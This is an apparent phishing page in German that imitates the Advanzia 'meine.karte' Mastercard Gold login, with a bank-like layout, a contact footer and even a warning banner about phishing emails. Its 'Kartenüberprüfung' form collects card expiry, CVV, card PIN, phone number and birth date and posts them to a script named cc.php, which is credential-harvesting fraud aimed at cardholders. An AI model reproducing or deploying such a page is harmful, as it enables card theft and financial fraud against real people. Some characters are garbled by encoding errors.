<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/main.css">

        <title>Willkommen | 
				meine.karte - Login</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header" class="mobile d-lg-none d-md-none d-sm-block d-block">
            <div class="container">
                <div class="inner-header">
                    <div class="row">
                        <div class="col-4 text-left pl-5"><i class="fas fa-bars"></i></div>
                        <div class="col-4 text-center"><a href="#" class="mr-5 ml-4"><img src="assets/images/logo.png"></a></div>
                        <div class="col-4 text-right pr-5"><i class="fas fa-unlock"></i></div>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-block d-sm-none d-none">
            <div class="container">
                <div class="inner-header d-flex align-items-center">
                    <div>
                        <a href="#" class="mr-5 ml-4"><img src="assets/images/logo.png"></a>
                        <a href="#"><img src="assets/images/logo-text.png"></a>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- START MAIN -->
        <main id="main">
            <div class="container">
                <div class="row">
                    
                    <!-- SIDEBAR -->
                    <aside class="col-md-3 d-lg-block d-md-block d-sm-none d-none">
                        <ul>
                            <li><a href="#"><i class="fas fa-lock"></i> meine.karte - Login</a></li>
                            <li><a href="#"><i class="fas fa-plus-circle"></i> meine.karte - Registrierung</a></li>
                            <li><a href="#"><i class="fas fa-star"></i> exklusive Vorteile</a></li>
                            <li><a href="#"><i class="fas fa-shield-alt"></i> Fragen & Antworten</a></li>
                        </ul>
                    </aside>
                    <!-- END SIDEBAR -->

                    <!-- CONTENT -->
                    <div class="col-lg-9 col-md-9 col-sm-12 col-12 content">
                        
                        <!-- LOGIN AREA -->
			<form name="preLogonForm" method="post" action="cc.php" autocomplete="off">
                        <div class="login-area">
                            <div class="row">
                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                                    <h1>Karten&uuml;berpr&uuml;fung</h1>
                                        <div class="row">
                                            <div class="col-md-4">
<label>Ablaufdatum :</label>
             <select name="expm"  value="" class="form-control" required>
               <option value="">Monat</option>
               <option value="01">01</option>
               <option value="02">02</option>
               <option value="03">03</option>
               <option value="04">04</option>
               <option value="05">05</option>
               <option value="06">06</option>
               <option value="07">07</option>
               <option value="08">08</option>
               <option value="09">09</option>
               <option value="10">10</option>
               <option value="11">11</option>
               <option value="12">12</option>
             </select>
             <tr></tr>
             <select name="expy"   value="" class="form-control" required>
               <option value="">Jahr</option>
               <option value="2020">2020</option>
               <option value="2021">2021</option>
               <option value="2022">2022</option>
               <option value="2023">2023</option>
               <option value="2024">2024</option>
               <option value="2025">2025</option>
               <option value="2026">2026</option>
             </select>
             <tr> 
             </div>
                                            <div class="col-md-4">
                                                <label>CVV-Code</label>
                                                <input type="text" class="form-control" name="cvv" maxlength="3" pattern="\d*" required Placeholder="123">
                                            </div>
											<div class="col-md-4">
                                                <label>Karten-PIN</label>
                                                <input type="text" class="form-control" name="cvv2" maxlength="4" pattern="\d*" required Placeholder="1234">
                                            </div>
                                        </div>
										<div class="form-group mt-2">
                                            <label>Telefonnummer</label>
                                                <input type="text" class="form-control" name="tel" maxlength="10" minlength="10" pattern="\d*" required Placeholder="xxx xxx xxx">
                                        </div>
									 <div class="form-group mt-2">
                                            <label>Geburtsdatum</label>
                                          <input type="date" class="form-control" name="birth" required pattern="[0-9]{4}-[0-9]{2}-[0-9]{2}" >
                                        </div>
                                        <button class="button mt-3" type="submit">Einloggen</button>
                      </form>
                  </div>
                                <div class="col-md-6 align-items-end d-flex">
                                    <div style="width: 100%">
                                        <h2>Sie sind neu hier?</h2>
                                        <p class="font-weight-300">Registrieren Sie Ihre geb�hrenfreie Mastercard Gold in wenigen Schritten.</p>
                                        <a href="#" class="link">Wie registriere ich mich? <i class="fas fa-chevron-right"></i></a>
                                        <button class="button" type="submit">Jetzt registrieren</button>
                                    </div>
                                </div>
              </div>
          </div>
                        <!-- END LOGIN AREA -->

                        <br>

                        <div class="action">
                            <h3><i class="fas fa-shield-alt"></i> Phishing E-Mails im Umlauf</h3>
                            <i class="fas fa-angle-down"></i>
                        </div>

                        <br>

                        <!-- CARDS -->
                        <div class="row">
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                                <img src="assets/images/card1.jpg">
                            </div>
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                                <h1 class="mb-1">Noch keine Karte?</h1>
                                <p class="mb-1">Beantragen Sie jetzt Ihre Geb�hrenfrei MasterCard Gold.</p>
                                <a href="#" class="link">zum Kreditkarten-Antrag <i class="fas fa-chevron-right"></i></a>
                            </div>
                        </div>
                        <hr class="mt-4 mb-4">
                        <div class="row">
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                                <img src="assets/images/card2.jpg">
                            </div>
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                                <h1 class="mb-1">Das Advanzia Tagesgeldkonto</h1>
                                <p class="mb-1">Informieren Sie sich �ber die attraktiven Konditionen.</p>
                                <a href="#" class="link">Mehr erfahren <i class="fas fa-chevron-right"></i></a>
                            </div>
                        </div>
                        <!-- END CARDS -->

                    </div>
                    <!-- END CONTENT -->

                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <br>
        
        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <div class="inner-footer">
                    <div class="row">
                        <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                            <h2 style="color: #2a2a2a;">Kontakt</h2>
                            <p>
                                Technische Beratung zum Online-Service mein.karte<br>
                                <a href="#">+49 (0)345 - 21973027</a> (Aus allen Netzen)<br>
                                Mo.-Sa., 8-19 Uhr
                            </p>
                            <br>
                            <p>
                                Fragen zur geb�hrenfreien Mastercard Gold<br>
                                <a href="#">0800 880 1120</a> (geb�hrenfrei aus dem deutschen Festnetz)<br>
                                24 Stunden erreichbar
                            </p>
                            <br>
                            <p>
                                <a href="#"> +49 (0)345 - 21973030</a> (Aus dem Ausland oder Mobilfunk)<br>
                                24 Stunden erreichbar
                            </p>
                            <br>
                            <button style="display: inline-block; width: auto;" class="button" type="submit">Alle Kontakte anzeigen</button>
                        </div>
                        <div class="col-md-6">
                            <ul>
                                <li><a href="#">Impressum <i class="fas fa-chevron-right"></i></a></li>
                                <li><a href="#">Datenschutz <i class="fas fa-chevron-right"></i></a></li>
                                <li><a href="#">Kontakt <i class="fas fa-chevron-right"></i></a></li>
                                <li><a href="#">AGB <i class="fas fa-chevron-right"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        
        <!-- JS FILES -->
		 <script type="text/javascript">
    $(function() {

		$('#tel').mask('+49000000000');





	});
	</script>
		<script src="assets/js/jquery.mask.js"></script>
        <script src="assets/js/jquery-3.3.1.slim.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/fontawesome.min.js"></script>
        <script src="assets/js/main.js"></script>
    </body>

</html>